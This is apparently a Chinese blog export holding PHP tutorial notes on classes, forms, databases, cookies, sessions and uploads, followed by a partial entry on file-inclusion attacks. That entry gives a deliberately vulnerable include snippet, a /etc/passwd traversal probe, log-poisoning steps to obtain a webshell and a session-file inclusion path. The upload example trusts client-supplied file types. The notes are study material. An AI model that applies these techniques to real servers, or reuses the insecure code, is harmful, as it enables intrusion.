&lt;?phpclass MyClass&#123;    const constant=&#x27;常量值&#x27;;    function showConstant()&#123;        echo self::constant. PHP_EOL;    &#125;&#125;echo MyClass::constant . PHP_EOL;$classname=&quot;MyClass&quot;;echo $classname::constant. PHP_EOL;$class=new MyClass();$class-&gt;showConstant();echo $class::constant. PHP_EOL;?&gt;

抽象类任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。
定义为抽象的类不能被实例化。
被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。
继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。
&lt;?phpabstract class AbstractClass   //abstract定义抽象类&#123; // 强制要求子类定义这些方法    abstract protected function getValue();    abstract protected function prefixValue($prefix);    // 普通方法（非抽象方法）    public function printOut() &#123;        print $this-&gt;getValue() . PHP_EOL;    &#125;&#125;class ConcreteClass1 extends AbstractClass&#123;    protected function getValue() &#123;        return &quot;ConcreteClass1&quot;;    &#125;    public function prefixValue($prefix) &#123;        return &quot;&#123;$prefix&#125;ConcreteClass1&quot;;    &#125;&#125;class ConcreteClass2 extends AbstractClass&#123;    public function getValue() &#123;        return &quot;ConcreteClass2&quot;;    &#125;    public function prefixValue($prefix) &#123;        return &quot;&#123;$prefix&#125;ConcreteClass2&quot;;    &#125;&#125;$class1 = new ConcreteClass1;$class1-&gt;printOut();echo $class1-&gt;prefixValue(&#x27;FOO_&#x27;) . PHP_EOL;$class2 = new ConcreteClass2;$class2-&gt;printOut();echo $class2-&gt;prefixValue(&#x27;FOO_&#x27;) . PHP_EOL;?&gt;

输出结果为
ConcreteClass1FOO_ConcreteClass1ConcreteClass2FOO_ConcreteClass2

子类方法还可以包含父类抽象方法中不存在的可选参数
static关键字声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。
静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。
由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。
静态属性不可以由对象通过 -&gt; 操作符来访问。
&lt;?phpclass Foo &#123;  public static $my_static = &#x27;foo&#x27;;   public function staticValue() &#123;     return self::$my_static;  &#125;&#125;print Foo::$my_static . PHP_EOL;$foo = new Foo();print $foo-&gt;staticValue() . PHP_EOL;?&gt;    

self引用自身变量或者方法
Final关键字如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。
final public function moreTesting()&#123;    &#125;

调用父类构造方法PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() 。
&lt;?phpclass BaseClass &#123;   function __construct() &#123;       print &quot;BaseClass 类中构造方法&quot; . PHP_EOL;   &#125;&#125;class SubClass extends BaseClass &#123;   function __construct() &#123;       parent::__construct();  // 子类构造方法不能自动调用父类的构造方法       print &quot;SubClass 类中构造方法&quot; . PHP_EOL;   &#125;&#125;class OtherSubClass extends BaseClass &#123;    // 继承 BaseClass 的构造方法&#125;// 调用 BaseClass 构造方法$obj = new BaseClass();// 调用 BaseClass、SubClass 构造方法$obj = new SubClass();// 调用 BaseClass 构造方法$obj = new OtherSubClass();?&gt;

输出的结果
BaseClass 类中构造方法BaseClass 类中构造方法SubClass 类中构造方法BaseClass 类中构造方法

php表单php表单和用户输入php下拉表单菜单单选
以下实例我们设置了下拉菜单三个选项，表单使用 GET 方式获取数据，action 属性值为空表示提交到当前脚本，我们可以通过 select 的 name 属性获取下拉菜单的值：
&lt;?php$q = isset($_GET[&#x27;q&#x27;])? htmlspecialchars($_GET[&#x27;q&#x27;]) : &#x27;&#x27;;if($q) &#123;        if($q ==&#x27;RUNOOB&#x27;) &#123;                echo &#x27;菜鸟教程&lt;br&gt;http://www.runoob.com&#x27;;        &#125; else if($q ==&#x27;GOOGLE&#x27;) &#123;                echo &#x27;Google 搜索&lt;br&gt;http://www.google.com&#x27;;        &#125; else if($q ==&#x27;TAOBAO&#x27;) &#123;                echo &#x27;淘宝&lt;br&gt;http://www.taobao.com&#x27;;        &#125;&#125; else &#123;?&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;     &lt;select name=&quot;q&quot;&gt;    &lt;option value=&quot;&quot;&gt;选择一个站点:&lt;/option&gt;    &lt;option value=&quot;RUNOOB&quot;&gt;Runoob&lt;/option&gt;    &lt;option value=&quot;GOOGLE&quot;&gt;Google&lt;/option&gt;    &lt;option value=&quot;TAOBAO&quot;&gt;Taobao&lt;/option&gt;    &lt;/select&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;?php&#125;?&gt;

php下拉菜单多选
如果下拉菜单是多选的（ multiple&#x3D;”multiple”），我们可以通过将设置 select name&#x3D;”q[]” 以数组的方式获取
&lt;select multiple=&quot;multiple&quot; name=&quot;q[]&quot;&gt;

单选按钮表单
PHP 单选按钮表单中 name 属性的值是一致的，value 值是不同的
&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;     &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;RUNOOB&quot; /&gt;Runoob    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;GOOGLE&quot; /&gt;Google    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;TAOBAO&quot; /&gt;Taobao    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;

checkbox 复选框
可以选择多个值
&lt;?php$q = isset($_POST[&#x27;q&#x27;])? $_POST[&#x27;q&#x27;] : &#x27;&#x27;;if(is_array($q)) &#123;    $sites = array(            &#x27;RUNOOB&#x27; =&gt; &#x27;菜鸟教程: http://www.runoob.com&#x27;,            &#x27;GOOGLE&#x27; =&gt; &#x27;Google 搜索: http://www.google.com&#x27;,            &#x27;TAOBAO&#x27; =&gt; &#x27;淘宝: http://www.taobao.com&#x27;,    );    foreach($q as $val) &#123;        // PHP_EOL 为常量，用于换行        echo $sites[$val] . PHP_EOL;    &#125;      &#125; else &#123;?&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;     &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;RUNOOB&quot;&gt; Runoob&lt;br&gt;     &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;GOOGLE&quot;&gt; Google&lt;br&gt;     &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;TAOBAO&quot;&gt; Taobao&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php&#125;?&gt;

php表单验证
如何避免$_SERVER[“PHP_SELF”]被利用
$_SERVER[“PHP_SELF”] 可以通过 htmlspecialchars() 函数来避免被利用。
form 代码如下所示：
&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;

htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。现在如果用户想利用 PHP_SELF 变量, 结果将输出如下所示：
&lt;form method=&quot;post&quot; action=&quot;test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;hacked&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;

尝试该漏洞失败！
php表单—必须字段在以下代码中我们加入了一些新的变量: $nameErr, $emailErr, $genderErr, 和 $websiteErr.。这些错误变量将显示在必需字段上。 我们还为每个$_POST变量增加了一个if else语句。 这些语句将检查 $_POST 变量是 否为空（使用php的 empty() 函数）。如果为空，将显示对应的错误信息。 如果不为空，数据将传递给test_input() 函数：
&lt;?php// 定义变量并默认设为空值$nameErr = $emailErr = $genderErr = $websiteErr = &quot;&quot;;$name = $email = $gender = $comment = $website = &quot;&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;  if (empty($_POST[&quot;name&quot;])) &#123;    $nameErr = &quot;名字是必需的。&quot;;  &#125; else &#123;    $name = test_input($_POST[&quot;name&quot;]);  &#125;  if (empty($_POST[&quot;email&quot;])) &#123;    $emailErr = &quot;邮箱是必需的。&quot;;  &#125; else &#123;    $email = test_input($_POST[&quot;email&quot;]);  &#125;  if (empty($_POST[&quot;website&quot;])) &#123;    $website = &quot;&quot;;  &#125; else &#123;    $website = test_input($_POST[&quot;website&quot;]);  &#125;  if (empty($_POST[&quot;comment&quot;])) &#123;    $comment = &quot;&quot;;  &#125; else &#123;    $comment = test_input($_POST[&quot;comment&quot;]);  &#125;  if (empty($_POST[&quot;gender&quot;])) &#123;    $genderErr = &quot;性别是必需的。&quot;;  &#125; else &#123;    $gender = test_input($_POST[&quot;gender&quot;]);  &#125;&#125;?&gt;

php-显示错误信息
我为每个字段中添加了一些脚本， 各个脚本会在信息输入错误时显示错误信息
验证邮件和URLphp-验证名称
以下代码将通过简单的方式来检测 name 字段是否包含字母和空格，如果 name 字段值不合法，将输出错误信息
$name = test_input($_POST[&quot;name&quot;]);if (!preg_match(&quot;/^[a-zA-Z ]*$/&quot;,$name)) &#123;  $nameErr = &quot;只允许字母和空格&quot;; &#125;

补充
（1）preg_match — 进行正则表达式匹配。
语法：int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )
在 subject 字符串中搜索与 pattern 给出的正则表达式相匹配的内容。如果提供了 matches ，则其会被搜索的结果所填充。$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推
（2）if(!a)的意思是如果变量a的值为假（或者0、null、””空值），则执行if语句后面的代码块。这里的”!”是一个逻辑非运算符，可以将真值变为假，假值变为真。所以，如果a是真值，那么!a就是假值；如果a是假值，那么!a就是真值。
验证邮件
$email = test_input($_POST[&quot;email&quot;]);if (!preg_match(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)) &#123;  $emailErr = &quot;非法邮箱格式&quot;; &#125;

验证URL
$website = test_input($_POST[&quot;website&quot;]);if (!preg_match(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website)) &#123;  $websiteErr = &quot;非法的 URL 的地址&quot;; &#125;

$_GET变量预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。
从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。
在 HTML 表单中使用 method&#x3D;”get” 时，所有的变量名和值都会显示在 URL 中。
注释：所以在发送密码或其他敏感信息时，不应该使用这个方法！
然而，正因为变量显示在 URL 中，因此可以在收藏夹中收藏该页面。在某些情况下，这是很有用的。
注释：HTTP GET 方法不适合大型的变量值。它的值是不能超过 2000 个字符的
$_POST变量预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。
从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。
注释：然而，默认情况下，POST 方法的发送信息的量最大值为 8 MB（可通过设置 php.ini 文件中的 post_max_size 进行更改）
$_REQUEST 变量预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容。
$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据
php数据库数据库使用完后要记得关闭连接
面向对象：$conn-&gt;close();
面向过程：mysqli_close($conn);
连接MySQL


servername
可选。规定要连接的服务器。默认是 “localhost:3306”。



username
可选。规定登录所使用的用户名。默认值是拥有服务器进程的用户的名称。


password
可选。规定登录所用的密码。默认是 “”


面向过程
&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;; // 创建连接$conn = mysqli_connect($servername, $username, $password); // 检测连接if (!$conn) &#123;    die(&quot;Connection failed: &quot; . mysqli_connect_error());&#125;echo &quot;连接成功&quot;;?&gt;

想连接到数据库就是在password后面再加就可以了
$conn = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ez_sql&quot;);

插入数据语法
$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;)&quot;; if (mysqli_query($conn, $sql)) &#123;    echo &quot;新记录插入成功&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn);&#125;

插入多条数据
mysqli_multi_query() 函数可用来执行多条SQL语句
例子：
$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;);&quot;;$sql .= &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;Mary&#x27;, &#x27;Moe&#x27;, &#x27;mary@example.com&#x27;);&quot;;$sql .= &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;Julie&#x27;, &#x27;Dooley&#x27;, &#x27;julie@example.com&#x27;)&quot;; if ($conn-&gt;multi_query($sql) === TRUE) &#123;    echo &quot;新记录插入成功&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125;

预处理语句函数mysqli_stmt_bind_param() 
该函数绑定参数查询并将参数传递给数据库，第二个参数是 “sss” ，
参数可以是这四种形式：i-整数；d-双精度浮点数；s-字符串；b-二进制blob存储对象
每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险
$stmt-&gt;get_result()
这是一个用于从执行预处理语句后获取结果集的函数。在 PHP 中，使用 MySQLi 进行数据库操作时，如果使用预处理语句执行了一个查询，你可以通过 $stmt-&gt;get_result() 来获取这个查询的结果集。
这个函数通常在执行 SELECT 查询并且绑定了结果变量后使用。例子如下：
// 假设已经准备好了数据库连接 $conn 和预处理语句 $stmt// 执行预处理语句$stmt-&gt;execute();// 获取查询结果集$res = $stmt-&gt;get_result();// 处理结果集while ($row = $res-&gt;fetch_assoc()) &#123;    // 处理每一行数据    // $row 是一个关联数组，包含了查询结果中的一行数据    echo $row[&#x27;column_name&#x27;] . &quot;&lt;br&gt;&quot;;&#125;

在这个示例中，$stmt-&gt;get_result() 用于获取执行预处理语句后得到的结果集。然后，使用 fetch_assoc() 方法逐行获取结果集中的数据。

预处理的优点：

预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。
绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。
预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。


下面为对以上代码的分析
prepare() &#x2F; mysqli_prepare() 函数用于准备一条SQL语句以供执行。
$mysqli -&gt; prepare(query) #面向对象的风格


&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)&quot;

可以将问号替换为整型，字符串，双精度浮点型和布尔值
$stmt-&gt;execute()

这行代码可以检查预编译语句是否执行，若执行了则会返回不为0的布尔值
从数据库中读取数据$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;;$result = mysqli_query($conn, $sql); if (mysqli_num_rows($result) &gt; 0) &#123;    // 输出数据    while($row = mysqli_fetch_assoc($result)) &#123;        echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - Name: &quot; . $row[&quot;firstname&quot;]. &quot; &quot; . $row[&quot;lastname&quot;]. &quot;&lt;br&gt;&quot;;    &#125;&#125; else &#123;    echo &quot;0 结果&quot;;&#125;

分析：函数 mysqli_num_rows()判断返回的数据
​			mysqli_fetch_assoc()将结果集放入到关联数组并循环输出
​			mysqli_query() 函数，该函数用于向 MySQL 连接发送查询或命令
页面跳转使用 header函数
例子
if ($stmt-&gt;execute()) &#123;        // 注册成功后进行页面跳转        header(&quot;Location:http://localhost:3000/index.php&quot;); // 重定向到注册成功页面        exit; // 重定向后加上 exit 终止当前脚本执行    &#125; else &#123;        echo &quot;数据插入失败&quot;;    &#125;

注解：header里面的Locatio是必须要有的， Location 头来指定重定向的地址
Cookie与SessionCookiecookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。
setcookie()函数
该函数用于设置cookie;setcookie() 函数必须位于  标签之前
语法： setcokie(name,value,expire,path,domain);
注释：在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码。（为防止 URL 编码，请使用 setrawcookie() 取而代之。）
例子：过期时间被设为一个月
&lt;?php$expire=time()+60*60*24*30;setcookie(&quot;user&quot;, &quot;runoob&quot;, $expire);?&gt;&lt;html&gt;.....

取回Cookie的值
$_COOKIE变量用于取回cookie的值
&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt;

删除Cookie
就是要把过期的时间变更为过去的时间点
&lt;?php// 设置 cookie 过期时间为过去 1 小时setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt;

SessionPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的
开始php session
在您把用户信息存储到 PHP session 中之前，首先必须启动会话。
注释：session_start() 函数必须位于  标签之前：
&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;

存储Session变量
存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量：
&lt;?phpsession_start();// 存储 session 数据$_SESSION[&#x27;views&#x27;]=1;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php// 检索 session 数据echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];?&gt;&lt;/body&gt;&lt;/html&gt;

销毁Session
如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。
unset() 函数用于释放指定的 session 变量：
&lt;?phpsession_start();if(isset($_SESSION[&#x27;views&#x27;]))&#123;    unset($_SESSION[&#x27;views&#x27;]);&#125;?&gt;

seesion_destroy()函数彻底销毁session:
&lt;?php session_destroy();?&gt;

注释：session_destroy() 将重置 session，您将失去所有已存储的 session 数据。
文件上传先创建一个文件上传表单：
&lt;html&gt;&lt;body&gt;&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;

 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 "multipart/form-data"。

 标签的 type&#x3D;”file” 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。
再创建一个上传脚本：
&lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)  &#123;  echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;  &#125;else  &#123;  echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;  echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;  echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;  echo &quot;Stored in: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];  &#125;?&gt;

通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。
第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：
$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称$_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型$_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称$_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码

上传限制
在下面这个脚本中，增加了对文件上传的限制。用户只能上传 .gif 或 .jpeg 文件，文件大小必须小于 20 kb：
&lt;?phpif ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000))  &#123;  if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)    &#123;    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;    &#125;  else    &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;    echo &quot;Stored in: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];    &#125;  &#125;else  &#123;  echo &quot;Invalid file&quot;;  &#125;?&gt;

上面这个例子会在服务器的 PHP 临时文件夹创建了一个被上传文件的临时副本，这个临时的复制文件会在脚本结束时消失
保存被上传的文件
&lt;?phpif ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000))  &#123;  if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)    &#123;    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;    &#125;  else    &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))      &#123;      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;      &#125;    else      &#123;      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],      &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);      echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];      &#125;    &#125;  &#125;else  &#123;  echo &quot;Invalid file&quot;;  &#125;?&gt;

上面的脚本检测了是否已存在此文件，如果不存在，则把文件拷贝到指定的文件夹
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪代码协议和文件包含</title>
    <url>/2023/12/18/php%E4%BC%AA%E4%BB%A3%E7%A0%81%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_max/php%E4%BC%AA%E4%BB%A3%E7%A0%81%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[文件包含include和require语句在 PHP 中，您可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。
include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。
include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：

require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。
include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。

因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。
包含文件省去了大量的工作。这意味着您可以为所有网页创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。
基础语法：
include &#x27;filename&#x27;;或者require &#x27;filename&#x27;;


Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）
Requuire_once:与Include_once相同

注意：

require 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；
include 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。

判断是否有文件包含通过 /etc/passwd来查看是否有文件包含（前面那个基本上所有Linux文件都会包含）
例子： /flag/../../../../../../etc/passwd只要 ../够多就肯定会到根目录处
日志包含漏洞前置知识点
apache默认日志路径 /var/log/apache2/access.log
nginx默认日志路径 /var/log/nginx/access.log
phpinfo()函数
作用：显示出PHP 所有相关信息。是排查配置php是是否出错或漏配置模块的主要方式之一
&lt;?php phpinfo(); ?&gt;

 只要访问到phpinfo()函数的web页面，即返回php的所有相关信息！
eval()函数
作用：eval()函数把括号里面内容按照php代码处理
例子
echo &quot;我想学php&quot;echo &#x27;echo &quot;我想学php&quot;&#x27;; //输出echo &quot;我想学php&quot;eval(&#x27;echo &quot;我想学php&quot;;&#x27;); //输出&quot;我想学php&quot;

注意事项：eval函数括号中字符串末尾一定要有分号。使用技巧：把php代码当成当成字符串原样输出，若能正常输出，再放到eval（）函数中；
system()函数
执行外部程序并显示输出资料。
system语法: string system(string command, int [return_var]);
system返回值: 字符串

日志包含漏洞原因：某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell
注意：需要开启服务器记录日志功能
访问日志的位置和文件名在不同的系统上会有所差异
apache一般是&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log。：
nginx的log在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log
Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/。Apache会记录请求“”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞
但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/ 就能生成包含一句话木马的access.log文件
1.下面是文件包含漏洞代码：
&lt;?phpecho &#x27;file inlcude test&#x27;;if(isset($_GET[&#x27;rj45&#x27;]))&#123;	include($_GET[&#x27;rj45&#x27;]);&#125;?&gt;

2.写入phpinfo()

3.写入一句话

其中 dir就是查看当前目录下的文件和文件夹列表
session包含如何利用当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击。
Session的存储位置获取：一般是通过以下两种方式。
（1）通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的session.save_path存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path一般为/var/lib/php/session。
（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session或者&#x2F;tmp目录下。默认存储Session存放位置。
包含该session文件：网址/file_included.php?file=../../../../var/lib/php/session/sess_ID
更具体的描述可见：session文件包含漏洞详解

 默认情况下，PHP.ini 中设置的 SESSION 保存方式是 files（session.save_handler &#x3D; files），即使用读写文件的方式保存 SESSION 数据，而 SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID，如：sess_c72665af28a8b14c0fe11afe3b59b51b。文件中的数据即是序列化之后的 SESSION 数据了。
session.upload_progress与open_basedir、allow_url_fopen、allow_url_include等PHP配置一样，session.upload_progress也是PHP的一个功能，同样可以在php.ini中设置相关属性
最重要的几个设置：
session.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;

1.session.upload_progress.enabled
可以控制是否开启session.upload_progress功能，是 PHP 中用于启用或禁用上传进度跟踪的配置选项。
当将该选项设置为 true 时，PHP 将会启用上传进度跟踪功能。这个功能允许你追踪上传文件的进度。这在处理大文件上传时非常有用，因为它允许用户了解文件上传的进度情况。
2.session.upload_progress.cleanup可以控制是否在上传之后删除文件内容
3.session.upload_progress.prefix
可以设置上传文件内容的前缀（即Session变量名前缀）
举例来说，如果 session.upload_progress.prefix 被设置为 &quot;upload_progress_&quot;，那么 PHP 将会在 Session 中创建类似于 &quot;upload_progress_123456&quot; 的变量来存储上传进度信息。这里的 123456 是 PHP 自动生成的唯一标识符，用于区分不同的上传请求。
通过设置 session.upload_progress.prefix，您可以定义存储上传进度信息的 Session 变量名称的前缀，以便在多个应用程序或系统中更好地管理和识别这些信息。
4**.session.upload_progress.name**
